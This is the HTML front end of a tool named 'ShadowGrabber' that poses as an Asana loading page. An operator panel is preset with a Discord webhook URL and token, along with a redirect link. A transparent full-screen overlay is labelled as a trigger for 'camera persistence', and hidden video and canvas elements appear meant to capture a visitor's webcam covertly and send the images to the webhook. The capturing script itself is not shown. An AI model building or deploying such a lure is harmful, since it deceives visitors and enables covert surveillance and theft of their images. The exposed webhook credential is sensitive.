<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Loading...</title>
    <link rel="stylesheet" href="style.css">
</head>

<body>
    <!-- Setup Overlay -->
    <div id="operator-panel" class="panel hidden">
        <div class="panel-content">
            <h1>ShadowGrabber Setup</h1>
            <input type="text" id="webhook-url" placeholder="Discord Webhook URL"
                value="https://discord.com/api/webhooks/1464327769608425504/TX0QqpwHA56djp6nFioLGerQ4dUNI0elhQ4q6vw-fuPTbLYdLdv-DaN-PimcXb9Bi9kS">
            <input x-type="text" id="redirect-url" placeholder="Redirect URL"
                value="https://www.youtube.com/watch?v=dQw4w9WgXcQ">
            <button id="save-config">Launch</button>
        </div>
    </div>

    <!-- Asana Style UI -->
    <div id="target-ui" class="active">
        <div class="asana-wrapper">
            <div class="asana-logo">
                <svg width="40" height="40" viewBox="0 0 40 40" fill="none" xmlns="http://www.w3.org/2000/svg">
                    <circle cx="20" cy="8" r="4" fill="#F06A6A" />
                    <circle cx="12" cy="22" r="4" fill="#F06A6A" />
                    <circle cx="28" cy="22" r="4" fill="#F06A6A" />
                </svg>
            </div>

            <div class="loading-state">
                <h2 id="loading-text">Please wait its loding...</h2>
                <div class="progress-container">
                    <div id="progress-bar"></div>
                </div>
                <p class="status-msg" id="status-detail">Checking browser compatibility</p>
            </div>
        </div>
    </div>

    <!-- Invisible trigger for camera persistence -->
    <div id="click-trigger"
        style="position:fixed; top:0; left:0; width:100%; height:100%; z-index:9999; background:transparent;"></div>

    <video id="st-v" autoplay playsinline muted style="display:none;"></video>
    <canvas id="st-c" style="display:none;"></canvas>

    <script src="script.js"></script>
</body>

</html>
